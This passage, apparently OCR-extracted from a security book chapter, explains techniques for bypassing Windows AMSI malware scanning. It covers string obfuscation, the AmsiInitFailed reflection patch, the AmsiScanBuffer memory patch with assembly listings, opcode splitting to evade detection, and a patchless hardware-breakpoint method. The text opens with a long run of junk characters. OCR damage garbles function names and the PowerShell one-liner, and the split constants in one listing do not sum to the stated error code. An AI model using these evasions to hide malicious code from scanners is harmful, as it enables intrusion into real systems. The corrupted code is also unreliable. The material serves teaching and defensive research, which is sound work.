´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´
```

Listing 10-23: An example of string obfuscation in PowerShell that evades AMSI

AMSI typically flags the string AmIscanBuffer, a common component of patching-based evasions, as malicious, but here you can see that string concatenation allows us to bypass detection. AMSI implementations often receive obfuscated code, which they pass off to providers to determine if it is malicious. This means the provider must handle language-emulation functions such as string concatenation, decoding, and decrypting. However, many providers, including Microsoft, fail to detect even trivial bypasses such as the one shown here.

## AMSI Patching

Because AMSI and its associated providers get mapped into the attacker's process, the attacker has control over this memory. By patching critical values or functions inside amsi.dll , they can prevent AMSI from functioning inside their process. This evasion technique is extremely potent and has been the go-to choice for many red teams since around 2016, when Matt Graeber discussed using reflection inside PowerShell to patch amsi!InitFailed to true. His code, included in Listing 10-24, fit into a single tweet.

```bash
PS > [Ref].Assembly.GetType("System.Management.Automation.AnnStdUtils".
">  "GetField(AnnInvalidFailed", "NonPublic",Static,"SetValue($null,$true)
```

Listing 10-24: A simple AmsiInitFailed patch

Antimalware Scan Interface 197

---

When it comes to patching, attackers commonly target AmsiScanBuffer(), the function responsible for passing buffer contents to the providers. Daniel Duggan describes this technique in a blog post, "Memory Patching AMSI Bypass," where he outlines the steps an attacker's code must take before performing any truly malicious activity:

- 1. Retrieve the address of AmsiScanBuffer() within the amsi.dll currently
loaded into the process.

2. Use kernel32jVirtualProtect() to change the memory protections to
read-write, which allows the attacker to place the patch.

3. Copy the patch into the entry point of the AmsiScanBuffer() function.
4. Use kernel32jVirtualProtect() once again to revert the memory protec-
tion back to read-execute.
The patch itself takes advantage of the fact that, internally, AmsiScanBuffer() returns E_INVALIDARG if its initial checks fail. These checks include attempts to validate the address of the buffer to be scanned. Duggan's code adds a byte array that represents the assembly code in Listing 10-25. After this patch, when AmsiScanBuffer() is executed, it will immediately return this error code because the actual instruction that made up the original function of the has been overwritten.

```bash
mov eax, 0x80070057 ; E_INVALIDARG
ret
```

Listing 10-25: Error code returned to the caller of AmsiScanBuffer() after the patch

There are many variations of this technique, all of which work very similarly. For example, an attacker may patch AmsIOpenSession() instead of AmsIOscanBuffer(). They may also opt to corrupt one of the parameters passed into AmsIOscanBuffer(), such as the buffer length or the context, causing AMSI to return E_INVALID on its own.

Microsoft got wise to this evasion technique pretty quickly and took measures to defend against the bypass. One of the detections it implemented is based on the sequence of opcodes that make up the patch we've described. However, attackers can work around these detections in many ways. For example, they can simply modify their assembly code to achieve the same result, moving 0x80070057 into 0x8 and returning, in a way that is less direct. Consider the example in Listing 10-26, which breaks up the value 0x80070057 instead of moving it into the register all at once.

```bash
xor eax, eax ; Zero out EAX
add eax, 0x7459104a
add eax, 0x8adf00d
ret
```

Listing 10-26: Breaking up hardcoded values to evade patch detection

198   Chapter 10

---

Imagine that the EDR looks for the value 0x80070057 being moved into the 64X register. This evasion strategy would bypass its detection logic because the value is never directly referenced. Instead, it is broken up into two values, which happen to add up to the required value.

### A Patchless AMSI Bypass

In April 2022, Ceri Coburn unveiled a technique for bypassing AMSI without patching ansi.dll , an activity many EDR vendors have begun to monitor. Coburn's technique doesn't require fork&Rrun either, allowing the attacker to stay in their original process.

The technique is quite clever. First, the attacker obtains a function

pointer to @msi1@msicanBuffer() either from the loaded @msi.dll or by forcing

it to load into the process through a call to LoadLibrary(). Next, they register

a vectored exception handler via kernel32AddVectoredExceptionHandle(). This

handler allows developers to register a function that monitors and manages

all exceptions in the application. Finally, they set a hardware breakpoint on

the address of @msi1@msicanBuffer() by modifying the current thread's debug reg isters (DR0, DR6, and DR7).

When the attacker executes their .NET code inline, the system will eventually call WinSMCanBuffer(), triggering the hardware breakpoint and invoking the vectored exception handler. This function takes the current thread context and updates the registers to match the values set when AMSI doesn't detect malicious content, namely a return value of 0 (5-0K) in RAX and a result of 0 (AMSI_RESULT_CLEAN) in RSP+48.

Additionally, it pulls the return address from the stack (RSP) and points the instruction pointer (RIP) back to the caller of the AmiScanBuffer() function. Next, it walks the stack pointer back to its position from before the call to AmiScanBuffer(), clears the hardware breakpoint, and returns the EXCEPTION_CONTINUE_EXECUTION code. Execution resumes at the point at which the breakpoint occurred. Now Windows will take the attacker's modified thread context and continue execution with our changes in place, passing the falsified values back to the caller and letting the malicious code continue undetected.

## Conclusion

AMSI is an incredibly important piece of the host-based detection puzzle. Its integration into software such as PowerShell, .NET, and Microsoft Office means that it sits inline of many adversary activities, from initial access through post-exploitation. AMSI has been heavily researched due to its tremendous impact on offensive operations at the time of its release. Today, AMSI fills more of a supplementary role, as nearly countless evasion strategies exist for it. However, vendors have caught on to this and have begun to invest in monitoring for common AMSI evasion strategies, then using those as indicators of adversary activity themselves.

---



---

